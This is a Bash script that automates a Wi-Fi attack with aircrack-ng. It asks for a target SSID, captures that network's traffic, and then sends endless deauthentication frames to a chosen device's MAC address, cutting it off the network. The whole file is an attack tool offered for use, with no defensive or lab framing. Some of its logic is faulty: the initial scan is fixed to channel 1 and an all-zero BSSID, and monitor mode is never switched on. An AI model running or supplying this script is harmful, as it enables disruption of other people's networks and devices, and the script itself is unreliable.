#!/bin/bash

cleanup() {
    if [ -n "$interface" ]; then
        echo "Disabling monitor mode on $interface..."
        sudo airmon-ng stop "$interface"
    fi
    exit
}

trap cleanup SIGINT

if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root using sudo."
    cleanup
fi

show_menu() {
    echo "Choose an option:"
    echo "1. Scan for a target Wi-Fi network"
    echo "2. Quit"
}

while true; do
    show_menu
    read -p "Enter your choice: " choice

    case "$choice" in
    1)
        echo "Updating package lists..."
        sudo apt update

        echo "Installing aircrack-ng..."
        sudo apt install -y aircrack-ng

        if [ $? -ne 0 ]; then
            echo "Failed to install aircrack-ng. Please check for errors."
            cleanup
        fi

        interface=$(iwconfig 2>/dev/null | grep -o '^[^ ]\+' | head -n 1)

        if [ -z "$interface" ]; then
            echo "Failed to find a wireless network interface. Please check your wireless adapter."
            cleanup
        fi

        echo "Found wireless interface: $interface"

        read -p "Enter the SSID of the target Wi-Fi network: " ssid

        echo "Scanning for the target network..."
        airodump-ng -c 1 --bssid 00:00:00:00:00:00 -w /tmp/scan "$interface" > /dev/null &

        sleep 10

        killall airodump-ng

        channel=$(grep "$ssid" /tmp/scan-01.csv | awk -F',' '{print $4}')
        bssid=$(grep "$ssid" /tmp/scan-01.csv | awk -F',' '{print $1}')

        echo "Found target network:"
        echo "SSID: $ssid"
        echo "Channel: $channel"
        echo "BSSID: $bssid"

        echo "Gathering data from the target network..."
        airodump-ng --bssid "$bssid" --channel "$channel" -w /tmp/capture "$interface" > /dev/null &

        read -p "Enter the MAC address of the target device: " target_mac

        echo "Deauthenticating the target device..."
        aireplay-ng --deauth 0 -a "$bssid" -c "$target_mac" "$interface"

        cleanup
        ;;
    2)
        cleanup
        ;;
    *)
        echo "Invalid choice. Please enter 1 or 2."
        ;;
    esac
done
